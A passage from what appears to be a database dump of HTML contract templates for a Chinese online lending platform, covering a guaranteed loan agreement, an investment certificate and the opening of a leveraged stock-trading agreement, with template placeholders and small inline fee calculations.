15px\">\n\t\t1）乙方提前清偿全部剩余借款时，应向甲方支付当期应还本息，剩余本金及提前还款补偿（补偿金额为剩余本金的{$deal.compensate_fee}%）。\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t2）乙方提前清偿全部剩余借款时，应向丙方支付当期借款管理费，乙方无需支付剩余还款期的借款管理费。\n\t</p>\n\t<p>\n\t\t3、提前偿还部分借款\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t1）乙方提前偿还部分借款，仍应向甲方支付全部借款利息。\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t2）乙方提前偿还部分借款，仍应向丙方支付全部应付的借款管理费。\n\t</p>\n\t<p>\n\t\t4、任何形式的提前还款不影响丙方向乙方收取在本协议第三条中说明的居间服务费。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第六条\t法律及争议解决\n\t</p>\n\t <p>\n\t\t 本协议的签订、履行、终止、解释均适用中华人民共和国法律，并由丙方所在地{function name=\"app_conf\" v=\'COMPANY_REG_ADDRESS\'}人民法院管辖。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第七条\t附则\n\t</p>\n\t<p>\n\t\t1、本协议采用电子文本形式制成，并永久保存在丙方为此设立的专用服务器上备查，各方均认可该形式的协议效力。\n\t</p>\n\t<p>\n\t\t2、本协议自文本最终生成之日生效。\n\t</p>\n\t<p>\n\t\t3、本协议签订之日起至借款全部清偿之日止，乙方或甲方有义务在下列信息变更三日内提供更新后的信息给丙方：本人、本人的家庭联系人及紧急联系人、工作单位、居住地址、住所电话、手机号码、电子邮箱、银行账户的变更。若因任何一方不及时提供上述变更信息而带来的损失或额外费用应由该方承担。\n\t</p>\n\t<p>\n\t\t4、如果本协议中的任何一条或多条违反适用的法律法规，则该条将被视为无效，但该无效条款并不影响本协议其他条款的效力。\n\t</p>\n        <br>\n\t{if $deal.attachment}\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第八条\t附件\n\t</p>\n\t<p>\n\t\t{$deal.attachment}\n\t</p>\n\t{/if}\n</div>\n<br/>\n<div style=\"width: 98%;text-align: right;\">\n\t<p>\n\t\t{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}\n\t</p>\n</div>',1,1),(6,'到期本息合同范本【担保】','<div style=\"width: 98%;text-align: right;\">编号：<span>{$deal.deal_sn}</span></div>\n<h2 align=\"center\">借款协议</h2>\n<br/>\n<div style=\"text-align: left;font-weight: 600;\">甲方（出借人）：</div>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n    <tr>\n\t<td style=\"text-align:center;\"> {$SITE_TITLE}用户名</td>\n\t<td style=\"text-align:center;\"> 借出金额</td>\n\t<td style=\"text-align:center;\">借款期限</td>\n\t<td style=\"text-align:center;\"> 到期还本息</td>\n    </tr>\n    {foreach from=\"$loan_list\" item=\"loan\"}\n    <tr>\n\t<td style=\"text-align:center;\">{$loan.user_name}</td>\n\t<td style=\"text-align:right;padding-right:10px\">{$CURRENCY_UNIT}{function name=\"number_format\" v=$loan.money f=2}</td>\n\t<td style=\"text-align:center;\">{$deal.repay_time}{if $deal.repay_time_type eq 0}天{else}个月{/if}</td>\n\t<td style=\"text-align:right;padding-right:10px\">\n\t{$CURRENCY_UNIT}{function name=\"number_format\" v=$loan.get_repay_money f=2}\n\t</td>\n    </tr>\n    {/foreach}\n    <tr>\n\t<td style=\"text-align:center;\">总计</td>\n\t<td style=\"text-align:right;padding-right:10px\">{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.load_money f=2}</td>\n\t<td>?</td>\n\t<td>?</td>\n    </tr>\n</table>\n<p>注：因计算中存在四舍五入，最后一期应收本息与之前略有不同</p>\n<br/>\n<div>\n\t<p style=\"text-align: left;font-weight: 600;\">乙方（借款人）：</p>\n\t<p style=\"text-align: left;font-weight: 600;\">{$SITE_TITLE}用户名：<span>{$deal.user.user_name}</span></p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\"> 丙方（见证人）：{function name=\"app_conf\" v=\"COMPANY\"} </p>\n\t<p style=\"text-align: left;font-weight: 600;\">联系方式：{function name=\"app_conf\" v=\"COMPANY_ADDRESS\"}</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\"> 丁方（担保方）：{$deal.agency_info.name} </p>\n\t<p style=\"text-align: left;font-weight: 600;\">联系方式：{$deal.agency_info.address}</p>\n</div>\n<br/>\n<p><strong>鉴于：</strong></p>\n<p>1、丙方是一家在{function name=\"app_conf\" v=\"COMPANY_REG_ADDRESS\"}合法成立并有效存续的有限责任公司，拥有{$SITE_URL} 网站（以下简称“该网站”）的经营权，提供信用咨询，为交易提供信息服务；</p>\n<p>2、乙方已在该网站注册，并承诺其提供给丙方的信息是完全真实的；</p>\n<p>3、甲方承诺对本协议涉及的借款具有完全的支配能力，是其自有闲散资金，为其合法所得；并承诺其提供给丙方的信息是完全真实的；</p>\n<p>4、乙方有借款需求，甲方亦同意借款，双方有意成立借贷关系；</p>\n<p>5、丁方愿意作为甲方借款提供保障。当乙方逾期3天仍未清偿借款本息，则甲方本协议项下的债权（逾期本息）自动转让给丁方，丁方将在第4天垫付该标的的未清偿借款本息给甲方；</p>\n<br/>\n<p style=\"text-align: left;font-weight: 600;\">各方经协商一致，于<span> {function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}</span>签订如下协议，共同遵照履行：</p>\n<br/>\n<p style=\"text-align: left;font-weight: 600;\"> 第一条 借款基本信息</p>\n<br/>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t<tr>\n\t\t<td width=\"20%\" style=\"padding-left:10px\"> 借款详细用途</td>\n\t\t<td style=\"padding-left:10px\"> {$deal.type_info.name}</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\">借款本金数额</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.borrow_amount f=2}（各出借人借款本金数额详见本协议文首表格）\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\">到期还本息\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.last_month_repay_money f=2}\n\t\t</td>\n\t</tr>\n\t\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t还款日\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t 自{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}起，{function name=\"to_date\" v=\"$deal.end_repay_time\" f=\"Y年m月d日\"}（24:00前，节假日不顺延）\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\"> 借款期限\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.repay_time}{if $deal.repay_time_type eq 0}天{else}个月{/if}，{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}起，至  {function name=\"to_date\" v=\"$deal.end_repay_time\" f=\"Y年m月d日\"}日止\n\t\t</td>\n\t</tr>\n</table>\n<br/>\n<div>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第二条 各方权利和义务\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>甲方的权利和义务</u>\n\t</p>\n\t<p> 1、\t甲方应按合同约定的借款期限起始日期将足额的借款本金支付给乙方。\n\t</p>\n\t<p> 2、\t甲方享有其所出借款项所带来的利息收益。\n\t</p>\n\t<p>3、\t如乙方违约，甲方有权要求丙方提供其已获得的乙方信息，丙方应当提供。\n\t</p>\n\t<p>4、\t无须通知乙方，甲方可以根据自己的意愿进行本协议下其对乙方债权的转让。在甲方的债权转让后，乙方需对债权受让人继续履行本协议下其对甲方的还款义务，不得以未接到债权转让通知为由拒绝履行还款义务。\n\t</p>\n\t<p> 5、\t甲方应主动缴纳由利息所得带来的可能的税费。\n\t</p>\n\t<p>6、\t如乙方实际还款金额少于本协议约定的本金、利息及违约金的，甲方各出借人同意各自按照其于本协议文首约定的借款比例收取还款。\n\t</p>\n\t<p> 7、\t甲方应确保其提供信息和资料的真实性，不得提供虚假信息或隐瞒重要事实。\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>乙方权利和义务</u>\n\t</p>\n\t<p> 1、\t乙方必须按期足额向甲方偿还本金和利息。\n\t</p>\n\t<p> 2、    乙方必须按期足额向丙方支付借款管理费用。\n\t</p>\n\t<p>3、\t乙方承诺所借款项不用于任何违法用途。\n\t</p>\n\t<p>4、\t乙方应确保其提供的信息和资料的真实性，不得提供虚假信息或隐瞒重要事实。\n\t</p>\n\t<p>5、\t乙方有权了解其在丙方的信用评审进度及结果。\n\t</p>\n\t<p> 6、\t乙方不得将本协议项下的任何权利义务转让给任何其他方。\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>丙方的权利和义务</u>\n\t</p>\n\t<p>1、甲方授权并委托丙方代其收取本协议文首所约定的出借人每月应收本息，代收后按照甲方的要求进行处置，乙方对此表示认可。\n\t</p>\n\t<p>2、甲方授权并委托丙方将其支付的出借本金直接划付至乙方账户，乙方对此表示认可。\n\t</p>\n\t<p> 3、甲、乙双方一致同意，在有必要时，丙方有权代甲方对乙方进行关于本协议借款的违约提醒及催收工作，包括但不限于：电话通知、上门催收提醒、发律师函、对乙方提起诉讼等。甲方在此确认委托丙方为其进行以上工作，并授权丙方可以将此工作委托给本协议外的其他方进行。乙方对前述委托的提醒、催收事项已明确知晓并应积极配合。\n\t</p>\n\t<p>4、丙方有权按月向乙方收取双方约定的借款管理费，并在有必要时对乙方进行违约提醒及催收工作，包括但不限于电话通知、发律师函、对乙方提起诉讼等。丙方有权将此违约提醒及催收工作委托给本协议外的其他方进行。\n\t</p>\n\t<p> 5、丙方接受甲乙双方的委托行为所产生的法律后果由相应委托方承担。如因乙方或甲方或其他方（包括但不限于技术问题）造成的延误或错误，丙方不承担任何责任。\n\t</p>\n\t<p> 6、丙方应对甲方和乙方的信息及本协议内容保密；如任何一方违约，或因相关权力部门要求（包括但不限于法院、仲裁机构、金融监管机构等），丙方有权披露。\n\t</p>\n\t<p>7、丙方根据本协议对乙方进行违约提醒及催收工作时，可在其认为必要时进行上门催收提醒，即丙方派出人员（至少2名）至乙方披露的住所地或经常居住地（联系地址）处催收和进行违约提醒，同时向乙方发送催收通知单，乙方应当签收，乙方不签收的，不影响上门催收提醒的进行。丙方采取上门催收提醒的，乙方应当向丙方支付上门提醒费用，收费标准为每次人民币1000.00元，此外，乙方还应向丙方支付进行上门催收提醒服务的差旅费（包括但不限于交通费、食宿费等）。\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>丁方的权利和义务</u>\n\t</p>\n\t<p>1、出借人和借款人均同意，丁方取得出借人在本协议项下的债权后，可依法向借款人追收借款本金、利息、逾期罚息等，清收费用，坏账风险均由丁方承担。\n\t</p>\n\t<p>2、款人逾期本网站对逾期仍未还款的借款人收取逾期罚息作为催收费用、采取多种方式进行催收、将借款人的相关信息对外公开或列入“不良信用记录”或采取法律措施等各项行为，该等服务的法律后果均由借款人自行承担，如债权转让给丁方后，对借款人造成的一切责任与本网站无关，均由借款人自行承担。\n\t</p>\n\t<p> 3、若借款人的任何一期还款不足以偿还应还本金、利息和违约金，且出借人为多人时，则出借人同意按照各自出借金额在出借金额总额中的比例收取还款，不足偿还本金时直接由丁方垫付后债权直接转让给丁方再进行追讨。\n\t</p>\n\t\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第三条 借款管理费及居间服务费\n\t</p>\n\t<p>1、\t在本协议中，“借款管理费”和“居间服务费”是指因丙方为乙方提供信用咨询、评估、还款提醒、账户管理、还款特殊情况沟通、本金保障等系列信用相关服务（统称“信用服务”）而由乙方支付给丙方的报酬。\n\t</p>\n\t<p>2、\t对于丙方向乙方提供的一系列信用服务，乙方同意在借款成功时向丙方支付本协议第一条约定借款本金总额的{function name=\"number_format\" v=$deal.services_fee f=1}%(即人民币<?php echo number_format(floatval($this->_var[\'deal\'][\'services_fee\'])*$this->_var[\'deal\'][\'borrow_amount\']/100,2); ?>元)作为居间服务费，该“居间服务费”由乙方授权并委托丙方在丙方根据本协议规定的“丙方的权利和义务”第2款规定向乙方划付出借本金时从本金中予以扣除，即视为乙方已缴纳。在本协议约定的借款期限内，乙方应每月向丙方支付本协议第一条约定借款本金总额的{$deal.manage_fee}% (即人民币{function name=\"number_format\" v=\"$deal.month_manage_money\" f=2}元)，作为借款管理费用，共需支付{if $deal.repay_time_type eq 0}1{else}{$deal.repay_time}{/if}期，共计人民币{function name=\"number_format\" v=\"$deal.all_manage_money\" f=2} 元，借款管理费的缴纳时间与本协议第一条约定的还款日一致。</p>\n\t<p> 本条所称的“借款成功时”系指本协议签署日。</p>\n\t<p> 3、    如乙方和丙方协商一致调整借款管理费和居间服务费时，无需经过甲方同意。 </p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第四条 违约责任\n\t</p>\n\t<p> 1、协议各方均应严格履行合同义务，非经各方协商一致或依照本协议约定，任何一方不得解除本协议。\n\t</p>\n\t<p>2、任何一方违约，违约方应承担因违约使得其他各方产生的费用和损失，包括但不限于调查、诉讼费、律师费等，应由违约方承担。如违约方为乙方的，甲方有权立即解除本协议，并要求乙方立即偿还未偿还的本金、利息、罚息、违约金。此时，乙方还应向丙方支付所有应付的借款管理费。如本协议提前解除时，乙方在{$SITE_URL}网站的账户里有任何余款的，丙方有权按照本协议第四条第3项的清偿顺序将乙方的余款用于清偿，并要求乙方支付因此产生的相关费用。</p>\n\t<p>3、乙方的每期还款均应按照如下顺序清偿：</p>\n\t<p>（1）根据本协议产生的其他全部费用；</p>\n\t<p>（2）本协议第四条第4款约定的罚息； </p>\n\t<p>（3）本协议第四条第5款约定的逾期管理费；</p>\n\t<p>（4）拖欠的利息； </p>\n\t<p>（5）拖欠的本金； </p>\n\t<p>（6）拖欠丙方的借款管理费；\n\t</p>\n\t<p>（7）正常的利息； </p>\n\t<p>（8）正常的本金； </p>\n\t<p>（9）丙方的借款管理费；</p>\n\t<p> 4、乙方应严格履行还款义务，如乙方逾期还款，则应按照下述条款向甲方支付逾期罚息，自逾期开始之后，逾期本金的正常利息停止计算。 </p>\n\t<p>罚息总额 = 逾期本息总额×对应罚息利率×逾期天数；</p>\n</div>\n<div>\n\t<br/>\n\t<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t\t<tr>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t逾期天数\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t1?<?php echo (int)app_conf(\"YZ_IMPSE_DAY\")-1; ?>天\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{function name=\"app_conf\" v=\"YZ_IMPSE_DAY\"}天及以上\n\t\t\t</td>\n\t\t</tr>\n\t\t<tr>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t罚息利率\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{$deal.impose_fee_day1}%\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{$deal.impose_fee_day2}%\n\t\t\t</td>\n\t\t</tr>\n\t</table>\n\t<br/>\n\t<p>\n\t\t5、乙方应严格履行还款义务，如乙方逾期还款，则应按照下述条款向丙方支付逾期管理费：\n\t</p>\n\t<p>\n\t\t逾期管理费总额 = 逾期本息总额×对应逾期管理费率×逾期天数；\n\t</p>\n</div>\n<br/>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t逾期天数\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t1?<?php echo (int)app_conf(\"YZ_IMPSE_DAY\")-1; ?>天\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{function name=\"app_conf\" v=\"YZ_IMPSE_DAY\"}天及以上\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t逾期管理费费率\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.manage_impose_fee_day1}%\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.manage_impose_fee_day2}%\n\t\t</td>\n\t</tr>\n</table>\n<br/>\n<div>\n\t<p>\n\t\t6、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，本协议项下的全部借款本息及借款管理费均提前到期，乙方应立即清偿本协议下尚未偿付的全部本金、利息、罚息、借款管理费及根据本协议产生的其他全部费用。\n\t</p>\n\t<p>\n\t\t7、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，丙方有权将乙方的“逾期记录”记入人民银行公民征信系统，丙方不承担任何法律责任。\n\t</p>\n\t<p>\n\t\t8、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，丙方有权将乙方违约失信的相关信息及乙方其他信息向媒体、用人单位、公安机关、检查机关、法律机关披露，丙方不承担任何责任。\n\t</p>\n\t<p>\n\t\t9、在乙方还清全部本金、利息、借款管理费、罚息、逾期管理费之前，罚息及逾期管理费的计算不停止。\n\t</p>\n\t<p>\n\t\t10、本协议中的所有甲方与乙方之间的借款均是相互独立的，一旦乙方逾期未归还借款本息，甲方中的任何一个出借人均有权单独向乙方追索或者提起诉讼。如乙方逾期支付借款管理费或提供虚假信息的，丙方亦可单独向乙方追索或者提起诉讼。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第五条 提前还款\n\t</p>\n\t<p>\n\t\t1、乙方可在借款期间任何时候提前偿还剩余借款。\n\t</p>\n\t<p>\n\t\t2、提前偿还全部剩余借款\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t1）乙方提前清偿全部剩余借款时，应向甲方支付当期应还本息，剩余本金及提前还款补偿（补偿金额为剩余本金的{$deal.compensate_fee}%）。\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t2）乙方提前清偿全部剩余借款时，应向丙方支付当期借款管理费，乙方无需支付剩余还款期的借款管理费。\n\t</p>\n\t<p>\n\t\t3、提前偿还部分借款\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t1）乙方提前偿还部分借款，仍应向甲方支付全部借款利息。\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t2）乙方提前偿还部分借款，仍应向丙方支付全部应付的借款管理费。\n\t</p>\n\t<p>\n\t\t4、任何形式的提前还款不影响丙方向乙方收取在本协议第三条中说明的居间服务费。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第六条\t法律及争议解决\n\t</p>\n\t <p>\n\t\t 本协议的签订、履行、终止、解释均适用中华人民共和国法律，并由丙方所在地{function name=\"app_conf\" v=\'COMPANY_REG_ADDRESS\'}人民法院管辖。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第七条\t附则\n\t</p>\n\t<p>\n\t\t1、本协议采用电子文本形式制成，并永久保存在丙方为此设立的专用服务器上备查，各方均认可该形式的协议效力。\n\t</p>\n\t<p>\n\t\t2、本协议自文本最终生成之日生效。\n\t</p>\n\t<p>\n\t\t3、本协议签订之日起至借款全部清偿之日止，乙方或甲方有义务在下列信息变更三日内提供更新后的信息给丙方：本人、本人的家庭联系人及紧急联系人、工作单位、居住地址、住所电话、手机号码、电子邮箱、银行账户的变更。若因任何一方不及时提供上述变更信息而带来的损失或额外费用应由该方承担。\n\t</p>\n\t<p>\n\t\t4、如果本协议中的任何一条或多条违反适用的法律法规，则该条将被视为无效，但该无效条款并不影响本协议其他条款的效力。\n\t</p>\n        <br>\n\t{if $deal.attachment}\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第八条\t附件\n\t</p>\n\t<p>\n\t\t{$deal.attachment}\n\t</p>\n\t{/if}\n</div>\n<br/>\n<div style=\"width: 98%;text-align: right;\">\n\t<p>\n\t\t{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}\n\t</p>\n</div>',1,1),(7,'投资凭证','<br/><br/>\r\n<h2 style=\"text-align:center;margin-top:0;font-size:28px;\">投 资 凭 据</h2>\r\n<div class=\"deal_sn\" style=\"text-align:right;\">凭据编号：{$params.deal.deal_sn}</div>\r\n<div style=\"font-size:18px;\">\r\n<div>尊敬的{$params.user.real_name}先生/女士：</div>\r\n<div>  <b> </b> 恭喜您于{$params.load.year}年{$params.load.month}月{$params.load.day}日通过金融理财网站平台为{$params.deal.deal_user}（公司/先生/女士）的{$params.deal.deal_name}项目融资借款投标成功：该融资项目由{$params.deal.agency_name}为您提供100%本息全额担保；</div>\r\n<div>  <b> </b> 您本次实际投资人民币大写：{$params.load.money}，该项目满标复审后正式生效，并按照《借款合同》约定计算收益，由借款人按约定还款方式及时间还本付息。如融资人出现违约行为，您可自动授权云南博政律师事务所进行追偿，律所将免收一切法律服务费用，但不得以任何理由视为律所之义务。您在借款人自逾期日起至还款日期间的利息，律所将按照借款人未还本金的年化24%的利率进行追偿。本凭据自盖章之日起生效，至借款人清偿借款本息之日起失效。</div>\r\n<div>  <b> </b> 您在此期间有任何疑问欢迎到店咨询或者随时拨打客服电话：0871－64111856我们将给予您详细的解答；</div>\r\n<div>  <b> </b> 金融理财为您投资理财创造辉煌！</div>\r\n<div>  <b> </b> 云南博政律师事务所为您本次投资保障合法有效！</div>\r\n<div>  <b> </b> 我们携手，共创未来！</div>\r\n</div>',1,0),(8,'天天赢合作操盘协议','<div id=\"contract\">\n  <div class=\"agr_warp\">\n    <div class=\"text-right\">合同编号：{$vo.order_sn}</div>\n    <h1>按天操盘合作操盘协议</h1>\n    <div class=\"text-center\">本合作操盘协议（下称“本协议”）由以下甲乙双方于 {if $vo.create_time}{$vo.create_time}{else}______年___月___日{/if}签署：\n    </div>\n    <div><b>甲方(委托方)：</b></div>\n    <div>公司名称：{function name=\"app_conf\" value=\"COMPANY\"}</div>\n    <div>地址：{function name=\"app_conf\" value=\"COMPANY_ADDRESS\"}</div>\n    <div><b>乙方(操盘方)：</b></div>\n    <div>真实姓名:{$deal.user.real_name}</div>\n    <div>身份证号：{$deal.user.idno}</div>\n    <div>{$SITE_TITLE}用户名：{$deal.user.user_name}</div>\n    <h2>第一条 总则</h2>\n    <div><b>鉴于：</b></div>\n    <p>1. 甲方是一家在杭州市合法成立并有效存续的有限责任公司，拥有 {$SITE_URL}  网站（下称“{$SITE_TITLE}”）的经营权，提供信用咨询，为交易提供信息服务；</p>\n    <p>2. 乙方已在{$SITE_TITLE}网站注册，并承诺其提供给甲方的信息是完全真实的；</p>\n    <p>3. 乙方有操盘股票交易账户获利的需求，甲方亦同意提供股票交易账户，双方有意成立委托操盘关系。</p>\n    <p><b>据此，各方经协商一致，达成如下协议，以资共同遵照履行：</b></p>\n    <h2>第二条 合作方式</h2>\n    <p>1. 乙方以保证金方式取得甲方股票交易账户的操作权限，且乙方独立承担操盘的全部风险。甲方授权给乙方操盘的股票交易账户可交易金额为乙方保证金的一定比例。具体约定如下：</p>\n    <div>\n      <table width=\"500\" align=\"center\">\n        <tr>\n          <td align=\"center\">乙方保证金金额</td>\n          <td align=\"center\">甲方股票交易账户初始金额</td>\n        </tr>\n        <tr>\n          <td align=\"center\">{$vo.cost_money_format}元</td>\n          <td align=\"center\">{$vo.borrow_money_format}元</td>\n        </tr>\n      </table>\n    </div>\n    <p>2. 乙方可以使用上述股票交易账户内资金总额购买上海或深圳证券交易所交易的股票，盈利归乙方所有，亏损亦由乙方承担，即乙方对上述账户进行股票买卖等操作产生的一切风险和后果由乙方承担，与甲方无关。</p>\n    <p>3. 本协议双方合作交易股票子账号操盘交易佣金为0.8‰（万分之八）。</p>\n    <p>4. 乙方购买的股票原则上应业绩优良、流通股本规模适度、流动性好。乙方购买股票要按照以下条件：</p>\n    <h3>1）不得购买S、ST、*ST、S*ST、SST、以及被交易所特别处理的股票；</h3>\n    <h3>2）不得购买权证类可以T+0交易的证券；</h3>\n    <h3>3）不得购买首日上市新股（或复牌首日股票）等当日不设涨跌停板限制的股票；</h3>\n    <h3>4）5倍杠杆借款金额50万以上单只股票不得超过账户总资产的50%（50万或以下不受限制）；</h3>\n    <h3>5）5倍杠杆借款金额100万以上创业板单只股票不得超过账户总资产的33%（100万或以下不受限制）；</h3>\n    <h3>6）10倍杠杆借款金额20万以上单只股票不得超过账户总资产的50%（20万或以下不受限制）；</h3>\n    <h3>7）15倍杠杆借款金额10万以上单只股票不得超过账户总资产的50%（10万或以下不受限制）；</h3>\n    <h3>8）其他限购股票以甲方网站通知为准，乙方需及时关注甲方网站通知，甲方不再通过其他方式通知，如因乙方未能及时查看网站通知造成的损失，皆由乙方独立承担；</h3>\n    <h3>9）不得进行坐庄、对敲、接盘、大宗交易、内幕信息等违反股票交易法律法规及证券公司规定的交易。</h3>\n    <h2>第三条 警戒线与平仓线</h2>\n    <p>1. 当股票交易账户内的总市值低于<span class=\'under_line\'>???{$vo.warning_line_format}???</span>元为警戒线，乙方只允许卖出股票，不能再买入股票。低于警戒线时需要尽快补充风险保证金，以免低于平仓线被平仓。</p>\n    <p>2. 当股票交易账户内的总市值低于<span class=\'under_line\'>???{$vo.open_line_format}???</span>元为平仓线，甲方有权修改密码并按任何价格卖出账户内所有股票，并终止协议。为避免平仓发生，请时刻关注风险保证金是否充足。</p>\n    <h2>第四条 账户管理费</h2>\n    <p>乙方根据甲方提供的账户初始资金金额，按账户的使用天数缴纳一定金额的账户管理费，具体金额为：<span class=\'under_line\'>???{$vo.rate_money_format}???</span>元/交易日。</p>\n    <h2>第五条 保证金及担保范围</h2>\n    <p>1. 乙方应根据本协议的约定支付保证金到甲方指定账户，并及时补足保证金。</p>\n    <p>2. 乙方保证金担保范围包括但不限于：账户管理费、滞纳金、违约金、损害赔偿金、诉讼费、律师费、调查费、公证费等为实现债权所发生的费用。</p>\n    <p>3. 如乙方未及时付清账户管理费，甲方有权从本协议对应的股票交易账户内平仓出金或修改密码限制买卖，然后从本协议对应的保证金中直接收取拖欠的账户管理费，如果本协议保证金不足以支付的，甲方有权从乙方在甲方平台账户余额或其他交易中追索拖欠的账户管理费。</p>\n    <p>4. 乙方每次追加保证金的金额不得低于交易账户初始总资金的1%，且每个交易日最多追加5次保证金。</p>\n    <p>5. 乙方授权甲方，如果乙方未能履行本协议约定的任何义务，甲方无论是否事先通知乙方，均可直接从乙方保证金中划扣乙方应付欠款。本授权委托在本协议法定诉讼时效内不可撤销。</p>\n    <h2>第六条 结算方式</h2>\n    <p>1. 乙方授权甲方在本协议终止前，每个交易日从乙方在甲方平台账户的余额中扣除次日账户管理费。</p>\n    <p>2. 当股票交易账户的总资产（包括现金和证券）大于初始金额时，视作股票交易账户的盈利，归乙方取得。</p>\n    <p>3. 本协议终止时，乙方应将股票交易账户的总资产资产全部变现为货币资金，以便甲方办理子账户内资产的清算手续。甲方须在办理完毕清算手续的三日内将除甲方本金和账户管理费之外的款项划转到乙方在甲方平台账户余额；如乙方所购股票中出现有停牌股票不能卖出，乙方可以继续支付账户管理费延续本协议直至停牌结束，否则甲方将按停牌前最后收盘价计算乙方交易账号盈亏完成账户结算。</p>\n    <p>4. 本协议终止时，甲方如未能全部收回其本金及账户管理费，有权向乙方追偿。乙方除归还甲方全部本金和账户管理费外，还应从协议终止之日起按甲方本金的0.1%/日向甲方支付违约金。</p>\n    <h2>第七条 甲方的权利、义务及违约责任</h2>\n    <p>1. 甲方有权监管股票交易账户的运作，对乙方进行账户管理和风险控制。</p>\n    <p>2. 甲方按本协议约定的金额每个交易日向乙方收取账户管理费。</p>\n    <p>3. 甲方有权在必要时对乙方进行账户管理费、交易损失的违约提醒及催收工作，包括但不限于电话通知、上门通知、发律师函、对乙方提起诉讼等。</p>\n    <p>4. 甲方应对乙方的信息及本协议内容保密；如乙方违约，或因相关权力部门要求（包括但不限于法院、仲裁机构、金融监管机构等），甲方有权披露。</p>\n    <p>5. 如乙方所购股票因异常波动、上市公司涉嫌违规需要进行调查以及突发性事件或不可抗力等原因导致该证券连续跌停板导致平仓无法实现，乙方须即时将账户内其它证券平仓，所得款项连同账户资金一并用于清偿甲方债权，不足部分由乙方自有资金偿还。同时，该证券复牌后或者连续跌停板打开且平仓可以实现时，如乙方仍有未清偿的债务，则甲方有权直接将该证券平仓用于清偿乙方所欠甲方的债务，剩余部分返还至乙方指定账户内。当乙方所欠甲方的债务全部清偿完毕，则甲方不再收取乙方的账户管理费和逾期违约金。</p>\n    <h2>第八条 乙方的权利、义务及违约责任</h2>\n    <p>1. 乙方可以通过甲方股票交易账户按照本协议约定进行买卖操作，有权收取使用股票交易账户内资金总额投资所得的收益，承担全部损失；无论股票交易账户盈亏如何，乙方须按本协议约定向甲方支付账户管理费。</p>\n    <p>2. 如股票交易账户内的所有股票出售（即清盘）后，还不足以归还甲方账号初始资金金额，乙方必须在清盘后三日内将亏损额补足归还给甲方，否则甲方有权从乙方在甲方进行交易的其他股票交易账户中扣除相应金额。</p>\n    <p>3. 